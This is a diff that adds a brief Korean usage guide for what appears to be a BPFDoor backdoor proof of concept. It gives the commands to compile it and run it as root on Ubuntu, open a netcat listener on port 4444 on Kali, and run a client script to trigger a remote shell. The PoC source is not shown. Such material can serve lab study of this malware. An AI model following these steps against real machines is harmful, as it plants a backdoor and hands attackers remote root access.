@@ -1,0 +1,11 @@
+1. 우분투에 bpfdoorpoc 실행
+컴파일 명령어: 
+
+gcc bpfdoorpoc.c -o bpfdoorpoc -lssl -lcrypto
+sudo ./bpfdoorpoc
+
+2. 칼리에 nc -lvnp 4444 하고 포트 대기
+3. 칼리에서 client.py 실행
+
+sudo python3 client.py
+
